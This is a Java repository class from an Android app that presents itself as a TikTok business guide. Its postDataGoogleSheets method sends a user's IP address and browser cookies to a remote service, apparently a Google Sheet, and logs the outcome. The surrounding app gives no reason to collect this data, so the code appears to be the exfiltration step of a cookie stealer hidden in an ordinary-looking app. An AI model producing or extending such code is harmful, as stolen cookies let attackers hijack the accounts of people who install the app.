package com.teamwork.businessguideprofortiktok.src.resource.repositories.google_sheet_repository;

import android.util.Log;

import androidx.lifecycle.LiveData;
import androidx.lifecycle.MutableLiveData;

import com.teamwork.businessguideprofortiktok.src.cores.services.APIServices;
import com.teamwork.businessguideprofortiktok.src.cores.services.DataService;


import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class GoogleSheetRepository {
    MutableLiveData<String> reponse1 = new MutableLiveData<>();

    public LiveData<String> getDataReponseSever(){
        return reponse1;
    }

    public void postDataGoogleSheets(String ip, String cookies) {
        DataService dataService = APIServices.getService();

        Call<String> callback = dataService.postDataGoogleSheets(ip, cookies);
        callback.enqueue(new Callback<String>() {
            @Override
            public void onResponse(Call<String> call, Response<String> response) {
                if (response.isSuccessful()) {
                    reponse1.setValue(response.body());
                    Log.d("TAG", "onResponse: " + response.toString());
                } else {
                    Log.d("TAG", "onResponse: err send code google sheet: " + response.toString());
                    reponse1.setValue("Error post data sever");
                }
            }

            @Override
            public void onFailure(Call<String> call, Throwable t) {
                Log.d("TAG", "onResponse: err send code google sheet onFailure: " + t.toString());
                reponse1.setValue("Please check internet of you");
            }
        });
    }

}
